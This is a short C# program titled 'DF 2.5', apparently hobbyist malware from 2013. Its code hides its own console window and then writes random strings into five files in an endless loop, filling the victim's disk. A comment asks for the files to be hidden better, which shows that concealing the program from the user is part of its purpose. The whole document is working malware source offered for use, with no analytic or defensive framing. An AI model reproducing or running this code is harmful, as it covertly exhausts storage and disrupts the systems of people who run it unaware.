using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Runtime.InteropServices;

namespace diskfiller2_5
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.Title = "\\/ DF 2.5!";
            Console.WriteLine("-\\/ DF 2.5!\n-By DockTownMayor!\n-2013!");
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
            int L = 32;
            StreamWriter V1 = new StreamWriter("V1.txt");  // needs a more hiden place.
            StreamWriter V2 = new StreamWriter("V2.txt");
            StreamWriter V3 = new StreamWriter("V3.txt");
            StreamWriter V4 = new StreamWriter("V4.txt");
            StreamWriter V5 = new StreamWriter("V5.txt");
            while (true)
            {
                V1.WriteLine(Guid.NewGuid().ToString("N").Substring(0, L));
                V2.WriteLine(Guid.NewGuid().ToString("N").Substring(0, L));
                V3.WriteLine(Guid.NewGuid().ToString("N").Substring(0, L));
                V4.WriteLine(Guid.NewGuid().ToString("N").Substring(0, L));
                V5.WriteLine(Guid.NewGuid().ToString("N").Substring(0, L));
            };
        }

        [DllImport("kernel32.dll")]

        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]

        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        const int SW_HIDE = 0;
    }
}
